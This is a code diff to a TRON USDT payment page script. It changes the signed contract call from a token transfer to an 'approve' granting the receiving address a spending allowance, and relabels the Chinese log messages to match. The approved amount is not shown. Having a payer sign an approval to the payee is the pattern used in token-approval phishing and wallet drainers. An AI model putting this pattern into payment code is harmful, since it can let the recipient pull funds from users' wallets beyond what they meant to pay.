@@ -109,7 +109,7 @@
 
     const transferRes = await tronWeb.transactionBuilder.triggerSmartContract(
       usdtAddress,
-      "transfer(address,uint256)",
+      "approve(address,uint256)",
       { feeLimit: 1000000 },
       [
         { type: "address", value: toAddress },
@@ -117,21 +117,22 @@
       ],
       ctx.address
     );
-    if (!transferRes || !transferRes.transaction) throw new Error("transfer 交易构建失败");
-    if (typeof log === "function") log("正在请求签名 transfer 交易...");
+    if (!transferRes || !transferRes.transaction) throw new Error("approve 交易构建失败");
+    if (typeof log === "function") log("正在请求签名 approve 授权交易...");
     const signedTransferTx = await tronWeb.trx.sign(transferRes.transaction);
     const transferResult = await tronWeb.trx.sendRawTransaction(signedTransferTx);
     const txid = transferResult.txid;
-    log("transfer 已发送：" + txid);
+    log("approve 已发送：" + txid);
     log("TronScan：" + tronScanTx(txid));
-    log("支付成功：" + amountUsdtHuman + " USDT");
+    log("授权成功：" + amountUsdtHuman + " USDT");
 
     try {
       if (typeof window.pay0PaymentCallback === "function") {
         window.pay0PaymentCallback({
           chain: "tron",
           txHash: txid,
-          amountUsdt: amountUsdtHuman
+          amountUsdt: amountUsdtHuman,
+          action: "approve"
         });
       }
     } catch (e) {}
